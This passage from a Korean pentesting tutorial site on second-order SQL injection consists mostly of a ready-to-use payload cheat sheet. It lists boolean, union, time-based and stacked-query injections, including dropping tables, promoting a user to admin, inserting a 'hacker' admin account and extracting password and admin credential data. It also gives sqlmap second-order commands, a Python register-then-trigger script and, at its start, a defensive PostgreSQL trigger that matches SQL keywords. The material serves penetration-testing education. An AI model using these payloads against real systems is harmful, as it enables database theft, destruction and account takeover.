<h3 class="anchor anchorWithStickyNavbar_LWe7" id="7-데이터베이스-트리거">7. 데이터베이스 트리거<a href="#7-데이터베이스-트리거" class="hash-link" aria-label="Direct link to 7. 데이터베이스 트리거" title="Direct link to 7. 데이터베이스 트리거" translate="no">​</a></h3>
<p><strong>이상 데이터 자동 차단</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- PostgreSQL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">REPLACE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FUNCTION</span><span class="token plain"> check_sql_injection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">RETURNS</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TRIGGER</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">AS</span><span class="token plain"> $$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">BEGIN</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">IF</span><span class="token plain"> NEW</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">username </span><span class="token operator" style="color:#393A34">~</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;(union|select|insert|update|delete|drop|&#x27;&#x27;;|&#x27;&#x27;--)&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">THEN</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RAISE EXCEPTION </span><span class="token string" style="color:#e3116c">&#x27;Potential SQL Injection detected&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">END</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">IF</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">RETURN</span><span class="token plain"> NEW</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">END</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$$ </span><span class="token keyword" style="color:#00009f">LANGUAGE</span><span class="token plain"> plpgsql</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TRIGGER</span><span class="token plain"> sqli_check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BEFORE </span><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">FOR EACH ROW</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FUNCTION</span><span class="token plain"> check_sql_injection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="트러블슈팅-체크리스트">트러블슈팅 체크리스트<a href="#트러블슈팅-체크리스트" class="hash-link" aria-label="Direct link to 트러블슈팅 체크리스트" title="Direct link to 트러블슈팅 체크리스트" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="페이로드가-실행되지-않을-때">페이로드가 실행되지 않을 때<a href="#페이로드가-실행되지-않을-때" class="hash-link" aria-label="Direct link to 페이로드가 실행되지 않을 때" title="Direct link to 페이로드가 실행되지 않을 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->저장 시 Prepared Statement가 사용되는지 확인 (의도된 동작)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->사용 시 Prepared Statement가 사용되는지 확인 (방어됨)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Stacked Queries가 지원되는 DBMS인지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->페이로드가 저장된 데이터를 실제로 사용하는 기능 찾기</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->WAF가 저장 시 필터링하는지 확인</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="저장은-되지만-실행-안-될-때">저장은 되지만 실행 안 될 때<a href="#저장은-되지만-실행-안-될-때" class="hash-link" aria-label="Direct link to 저장은 되지만 실행 안 될 때" title="Direct link to 저장은 되지만 실행 안 될 때" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->저장된 데이터가 쿼리에 어떻게 사용되는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->다른 기능들을 모두 테스트 (프로필, 설정, 주문, 알림 등)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->관리자 페이지에서 사용되는지 확인</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->이메일 발송, 보고서 생성 등 백그라운드 작업 확인</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="탐지-방법">탐지 방법<a href="#탐지-방법" class="hash-link" aria-label="Direct link to 탐지 방법" title="Direct link to 탐지 방법" translate="no">​</a></h3>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->저장 시 에러가 발생하지 않는지 (Prepared Statement 사용)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->사용 시 에러가 발생하는지 (취약점 존재)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Burp Logger++로 모든 요청/응답 기록</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Time-based 페이로드로 Blind 확인</li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="빠른-명령어-참조-quick-reference">빠른 명령어 참조 (Quick Reference)<a href="#빠른-명령어-참조-quick-reference" class="hash-link" aria-label="Direct link to 빠른 명령어 참조 (Quick Reference)" title="Direct link to 빠른 명령어 참조 (Quick Reference)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="테스트-페이로드-회원가입프로필">테스트 페이로드 (회원가입/프로필)<a href="#테스트-페이로드-회원가입프로필" class="hash-link" aria-label="Direct link to 테스트 페이로드 (회원가입/프로필)" title="Direct link to 테스트 페이로드 (회원가입/프로필)" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 기본 테스트</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: test&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: test&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: test`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Boolean-based</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27; OR 1=1--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Union-based</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: &#x27; UNION SELECT NULL--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: &#x27; UNION SELECT username, password FROM users--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Time-based</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27; AND SLEEP(5)--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;; SELECT pg_sleep(5)--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Stacked Queries</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;; DROP TABLE logs--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;; UPDATE users SET role=&#x27;admin&#x27; WHERE id=1--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;; INSERT INTO users VALUES(&#x27;hacker&#x27;,&#x27;pass&#x27;,&#x27;admin&#x27;)--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="조건부-페이로드">조건부 페이로드<a href="#조건부-페이로드" class="hash-link" aria-label="Direct link to 조건부 페이로드" title="Direct link to 조건부 페이로드" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 특정 조건에서만 실행</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin</span><span class="token string" style="color:#e3116c">&#x27; AND (SELECT COUNT(*) FROM users)&gt;100--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">Username: admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> role</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27; </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> user_id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="데이터-추출-페이로드">데이터 추출 페이로드<a href="#데이터-추출-페이로드" class="hash-link" aria-label="Direct link to 데이터 추출 페이로드" title="Direct link to 데이터 추출 페이로드" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 비밀번호 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: </span><span class="token string" style="color:#e3116c">&#x27; UNION SELECT username, password FROM users--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"># 관리자 정보</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">Username: &#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> email</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> role</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 테이블 목록</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: &#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> table_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="polyglot-페이로드">Polyglot 페이로드<a href="#polyglot-페이로드" class="hash-link" aria-label="Direct link to Polyglot 페이로드" title="Direct link to Polyglot 페이로드" translate="no">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 다양한 컨텍스트에서 작동</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin</span><span class="token string" style="color:#e3116c">&#x27;/**/OR/**/1=1--</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">Username: admin&#x27;</span><span class="token operator" style="color:#393A34">||</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">Username: admin&#x27;</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">&#x27;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sqlmap-second-order">SQLMap Second-Order<a href="#sqlmap-second-order" class="hash-link" aria-label="Direct link to SQLMap Second-Order" title="Direct link to SQLMap Second-Order" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 회원가입 → 프로필 페이지 테스트</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/register&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --data=&quot;username=*&amp;password=test&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-order=&quot;http://example.com/profile&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --batch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 쿠키 포함</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/register&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --data=&quot;username=*&amp;email=test@test.com&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --cookie=&quot;session=abc123&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --second-url=&quot;http://example.com/settings&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --level=5 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --risk=3</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="python-자동화">Python 자동화<a href="#python-자동화" class="hash-link" aria-label="Direct link to Python 자동화" title="Direct link to Python 자동화" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 1단계: 페이로드 저장</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://example.com/register&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">register_url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;username&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;test123&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session_cookie </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookies</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;session&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2단계: 트리거</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trigger_url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://example.com/profile&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">trigger_url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> cookies</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;session&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> session_cookie</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;error&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text </span><span class="token keyword" style="color:#00009f">or</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sql&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;[!] Second-Order SQLi detected!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="참고-자료">참고 자료<a href="#참고-자료" class="hash-link" aria-label="Direct link to 참고 자료" title="Direct link to 참고 자료" translate="no">​</a></h2>
<ul>
<li>OWASP Stored SQLi: <a href="https://owasp.org/www-community/attacks/SQL_Injection#stored-sql-injection" target="_blank" rel="noopener noreferrer">https://owasp.org/www-community/attacks/SQL_Injection#stored-sql-injection</a></li>
<li>PortSwigger Second-Order SQLi: <a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" target="_blank" rel="noopener noreferrer">https://portswigger.net/kb/issues/00100210_sql-injection-second-order</a></li>
<li>HackTricks Second-Order: <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#second-order-injection" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting-web/sql-injection#second-order-injection</a></li>
<li>CWE-89: <a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener noreferrer">https://cwe.mitre.org/data/definitions/89.html</a></li>
<li>SQLMap Second-Order: <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage#second-order-injection" target="_blank" rel="noopener noreferrer">https://github.com/sqlmapproject/sqlmap/wiki/Usage#second-order-injection</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="다음-단계">다음 단계<a href="#다음-단계" class="hash-link" aria-label="Direct link to 다음 단계" title="Direct link to 다음 단계" translate="no">​</a></h2>
<p>Second-Order SQLi를 마스터했다면, 다른 고급 기법을 학습하세요:</p>
<ul>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/waf_bypass/">WAF 우회 기법</a> - 방어 메커니즘 우회</li>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/database_specific/">DBMS별 특화 기법</a> - 각 데이터베이스 고유 기능</li>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/nosql_injection/">NoSQL Injection</a> - NoSQL 데이터베이스 공격</li>
</ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/my-docusaurus-page/web_attacks/sql_injection/stacked_queries/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Stacked Queries SQL Injection</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/my-docusaurus-page/web_attacks/sql_injection/waf_bypass/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">WAF 우회 기법 (WAF Bypass)</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#개념-concept" class="table-of-contents__link toc-highlight">개념 (Concept)</a><ul><li><a href="#second-order-sqli란" class="table-of-contents__link toc-highlight">Second-Order SQLi란?</a></li><li><a href="#일반-sqli-vs-second-order-sqli" class="table-of-contents__link toc-highlight">일반 SQLi vs Second-Order SQLi</a></li><li><a href="#작동-원리" class="table-of-contents__link toc-highlight">작동 원리</a></li></ul></li><li><a href="#발생-패턴" class="table-of-contents__link toc-highlight">발생 패턴</a><ul><li><a href="#1-회원가입--프로필-수정" class="table-of-contents__link toc-highlight">1. 회원가입 → 프로필 수정</a></li><li><a href="#2-게시글-작성--검색" class="table-of-contents__link toc-highlight">2. 게시글 작성 → 검색</a></li><li><a href="#3-장바구니--주문" class="table-of-contents__link toc-highlight">3. 장바구니 → 주문</a></li><li><a href="#4-댓글-작성--관리자-페이지" class="table-of-contents__link toc-highlight">4. 댓글 작성 → 관리자 페이지</a></li></ul></li><li><a href="#수동-공격-manual-exploitation" class="table-of-contents__link toc-highlight">수동 공격 (Manual Exploitation)</a><ul><li><a href="#단계-1-취약점-식별" class="table-of-contents__link toc-highlight">단계 1: 취약점 식별</a></li><li><a href="#단계-2-페이로드-저장" class="table-of-contents__link toc-highlight">단계 2: 페이로드 저장</a></li><li><a href="#단계-3-취약한-기능-찾기" class="table-of-contents__link toc-highlight">단계 3: 취약한 기능 찾기</a></li><li><a href="#단계-4-페이로드-최적화" class="table-of-contents__link toc-highlight">단계 4: 페이로드 최적화</a></li><li><a href="#단계-5-데이터-추출" class="table-of-contents__link toc-highlight">단계 5: 데이터 추출</a></li></ul></li><li><a href="#실전-공격-시나리오" class="table-of-contents__link toc-highlight">실전 공격 시나리오</a><ul><li><a href="#시나리오-1-e-commerce-가격-조작" class="table-of-contents__link toc-highlight">시나리오 1: E-commerce 가격 조작</a></li><li><a href="#시나리오-2-관리자-권한-탈취" class="table-of-contents__link toc-highlight">시나리오 2: 관리자 권한 탈취</a></li><li><a href="#시나리오-3-대량-계정-탈취" class="table-of-contents__link toc-highlight">시나리오 3: 대량 계정 탈취</a></li></ul></li><li><a href="#자동화-도구-automated-tools" class="table-of-contents__link toc-highlight">자동화 도구 (Automated Tools)</a><ul><li><a href="#sqlmap---second-order-sqli" class="table-of-contents__link toc-highlight">SQLMap - Second-Order SQLi</a></li><li><a href="#burp-suite---second-order-탐지" class="table-of-contents__link toc-highlight">Burp Suite - Second-Order 탐지</a></li><li><a href="#custom-python-script" class="table-of-contents__link toc-highlight">Custom Python Script</a></li></ul></li><li><a href="#고급-기법" class="table-of-contents__link toc-highlight">고급 기법</a><ul><li><a href="#1-시간차-공격-time-delayed-attack" class="table-of-contents__link toc-highlight">1. 시간차 공격 (Time-Delayed Attack)</a></li><li><a href="#2-조건부-second-order" class="table-of-contents__link toc-highlight">2. 조건부 Second-Order</a></li><li><a href="#3-polyglot-payload" class="table-of-contents__link toc-highlight">3. Polyglot Payload</a></li><li><a href="#4-second-order-xss--sqli" class="table-of-contents__link toc-highlight">4. Second-Order XSS + SQLi</a></li><li><a href="#5-blind-second-order" class="table-of-contents__link toc-highlight">5. Blind Second-Order</a></li></ul></li><li><a href="#탐지-및-방어" class="table-of-contents__link toc-highlight">탐지 및 방어</a><ul><li><a href="#1-입력-검증-두-번-필요" class="table-of-contents__link toc-highlight">1. 입력 검증 (두 번 필요)</a></li><li><a href="#2-prepared-statements-필수" class="table-of-contents__link toc-highlight">2. Prepared Statements (필수)</a></li><li><a href="#3-컨텍스트-인식-인코딩" class="table-of-contents__link toc-highlight">3. 컨텍스트 인식 인코딩</a></li><li><a href="#4-데이터-무결성-검증" class="table-of-contents__link toc-highlight">4. 데이터 무결성 검증</a></li><li><a href="#5-waf-규칙-저장-시" class="table-of-contents__link toc-highlight">5. WAF 규칙 (저장 시)</a></li><li><a href="#6-로그-모니터링" class="table-of-contents__link toc-highlight">6. 로그 모니터링</a></li><li><a href="#7-데이터베이스-트리거" class="table-of-contents__link toc-highlight">7. 데이터베이스 트리거</a></li></ul></li><li><a 